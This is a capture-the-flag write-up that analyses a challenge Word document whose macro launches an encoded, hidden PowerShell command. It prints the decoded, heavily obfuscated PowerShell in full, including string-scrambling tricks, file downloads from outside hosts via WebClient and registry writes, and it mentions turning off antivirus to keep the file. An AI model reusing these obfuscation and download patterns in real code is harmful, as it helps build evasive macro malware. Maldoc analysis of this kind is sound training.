# **S1mple Obfusc4tion**

```
The flag has 2 parts. Part 2 has been encode and saved somewhere. Can you find it?

Download file: https://drive.google.com/file/d/1ZmWZiTTqL62wjZvhgcZabrt59W-Mq7uQ/view?usp=sharing
Password: wargame
```

Extract the given compressed file with the given password, we will have a .doc file. I must turn off my anti virus program because it kept deleting my file LMAO. 

Open it up and we see a macro. I had done a lot of research about macro in .doc file then I found [this](https://www.decalage.info/vba_tools).

![Macro](https://user-images.githubusercontent.com/89141562/188659787-5c357edf-855a-4b63-a3bb-56165818a946.png)

So we will use a tool call `olevba`. We have something like this.

![](https://user-images.githubusercontent.com/89141562/188659291-a3647f33-102b-437b-b0eb-504bc7f2f318.png)

I found a malicious content in the macro:

```
uxZIlRCaHe = "Powershell.exe -WindowStyle Hidden -nop -ENCOD JABFAGcAUgBJADkAYgBqAGg...cgBdADMANgApACAAfAAgAGkAZQB4AH0AOwANAAoA"
```
There's a lot of it so that I can't show you guys all sorry :'(

Look likes it was powershell commands but was encoded with base64, so I put it to `cyberchef` to decode it and here is what I found. Very interesting:

![](https://user-images.githubusercontent.com/89141562/188659390-27fac218-3d8a-4fed-953b-63a53c04bf40.png)

```powershell
$EgRI9bjh5S = ('New-Tem' + 'p' + 'orar' + 'yFile')|& ( $pshOme[4] + $psHOmE[34] + 'X');
$GLHNe0URoh = (100, 71, 104, 108, 73, 72, 82, 104, 97);
$GF8UYpawBX = ((("{4}{3}{2}{6}{5}{1}{0}"  -f 'llName', 'h5S.Fu', 'R', 'g', 'tP7E', 'j', 'I9b'))   -rePLACe 'tP7', [CHaR]36)|& ((get-VArIABLe '*mDr*').NaME[3, 11, 2] -jOIN'');
$GLHNe0URoh += (87, 119, 103, 98, 50, 89, 103, 100, 71, 104, 108, 73, 71, 90, 115, 89, 87);
$GLHNe0URoh += (99, 103, 79, 105, 74, 102, 97, 72, 86, 122, 100, 71, 119, 122, 88, 51, 73, 122, 89, 87, 120, 102, 97, 71, 70);
$Eg4w85M9Qi = (('trS' + 'Wxrked ' + 'sx hca' + 'd' + 'rd' + ', fx' + 'r' + 'gxt' + ' hx' + 'w tx v' + 'cadcca' + 'dtix' + 'n!' + '!' + '!!tr' + 'S.Re' + 'P' + 'lAc' + 'E(trSxtr' + 'S,' + 'trS0trS).' + 'R' + 'e' + 'PlAcE(t' + 'r' + 'S' + 'ca' + 'dt' + 'rS,tr' + 'Sat' + 'rS' + ')')   -repLaCE 'trS', [CHAr]39) | . ((varIaBle '*mdr*').namE[3, 11, 2] -jOin'');
$GLHNe0URoh += (121, 90, 72, 48, 105);
$sEpb5puTtV = (('{4}{0}{3}{5}{1}{7}{2}{6}' -f 'nVerT]:', 'HNe', 'h', ':toBaSE6', '[System.Co', '4STRINg(jD8GL', ')', '0URo')).rePLACe(([chAR]106 + [chAR]68 + [chAR]56), [strIng][chAR]36) |& ((VArIaBLe '*MDR*').nAME[3, 11, 2] -jOin'');
echo $sEpb5puTtV | .('{2}{1}{0}'  -f 'ile', 'ut-f', 'o') ${GF8UYpawBX};
$azfcfToiBq = ("{1}{4}{8}{7}{2}{5}{6}{9}{3}{0}"  -f 'ion', 'Welc', '_Warga', 'cat', 'om', 'me!', 'S1mple', 'o', 'e_t', '_Obfu');
$cOP2lgqRhb = 'Xgf{jgn{tgz|{c<Pg;}k';
$cOP2lgqRhb.("{1}{2}{0}"  -f 'ay', 'tocha', 'rarr').invoke() | .("{2}{1}{0}{3}"  -f'-', 'ach', 'fore', 'object')   -Process { $rEianMEKgy += [char]([byte][char]$_  -bxor 0xf) };
$C4Lg8xccWH = 'https:][(s)]w][(s)]wwhitehat.com][(s)]ww1zw][(s)]w$https:][(s)]w][(s)]wwargame.com][(s)]wthuchanh'.repLAcE((']' + '[' + ('(s)]' + 'w')), ([array]('/'), ('xw' + 'e'))[0]).sPlIT('$');
$mAMq5ixXLi = 0;
try {
    foreach($JJU1E8IktL  in $C4Lg8xccWH) {
        (New - Object System.Net.WebClient).DownloadFile($JJU1E8IktL, 'C:\Users\Whitehat')
    }

} catch [System.Net.WebException], [System.IO.IOException] {
    ("{9}{3}{7}{0}{10}{8}{2}{5}{11}{6}{4}{1}"  -f 'on', 'ist!!!', ' or Fil', 'nne', 'ex', 'e does ', 't ', 'cti', 'ailed!!!', 'Co', ' F', 'no');
    $mAMq5ixXLi = 1
};
(('New' + '-Item -Path ' + '{0' + '}HK' + 'C' + 'U:{0}' + ' ' + '-' + 'Name ' + '{0}whit' + 'eha' + 't{0}') -F  [char]34)| iex;
if ($mAMq5ixXLi   -gt 0)  {
    (('New' + '-' + 'I' + 'temProperty' + ' -Pat' + 'h I9' + 'KHKCU:1' + 'Lewhitehat' + 'I9' + 'K -Nam' + 'e I9' + 'Kwarga' + 'meI9K -Va' + 'lue Nzvazf' + 'c' + 'fToiBq' + ' -PropertyType I9KStri' + 'ngI9K').RePlACe('I9K', [sTrIng][Char]34).RePlACe(([Char]49 + [Char]76 + [Char]101), [sTrIng][Char]92).RePlACe(([Char]78 + [Char]122 + [Char]118), '$'))| iex
} else {
    PS C:\Users\my_ant_ti3m > ((("{4}{9}{0}{13}{7}{3}{1}{10}{8}{6}{16}{12}{11}{2}{15}{5}{14}"  - f'roperty -P', 'CU:rBQwh', 'o', 'lX1HK', 'New-It', 'e lX1', 'lX1wargamelX1 ', 'h ', ' ', 'emP', 'itehatlX1 -Name', '-Pr', ' ', 'at', 'StringlX1', 'pertyTyp', '-Value 8qarEianMEKgy '))   - rEpLACe ([ChAr]108 + [ChAr]88 + [ChAr]49), [ChAr]34  - rEpLACe([ChAr]114 + [ChAr]66 + [ChAr]81), [ChAr]92   - crepLacE([ChAr]56 + [ChAr]113 + [ChAr]97), [ChAr]36) | iex
};
```
I used Base64 decode, text decode with UTF-16LE and code tidy. So I noticed that `$GLHNe0URoh` was a variable which was added some ASCII to it. Using `dcode`, I had this: `dGhlIHRhaWwgb2YgdGhlIGZsYWcgOiJfaHVzdGwzX3IzYWxfaGFyZH0i`. Then base64 again:

![](https://user-images.githubusercontent.com/89141562/188659529-2151b7d9-e3a2-4dbd-8ccf-03371f2d3068.png)

It was just the end of the flag, I must find the head in those code. I had tried many variables, but `$rEianMEKgy` gave me this

![](https://user-images.githubusercontent.com/89141562/188659556-2921f00e-e362-4bbd-ab66-4bc1f44746ce.png)

## FLAG: Whitehat{hustl3_h4rd_hustl3_r3al_hard}

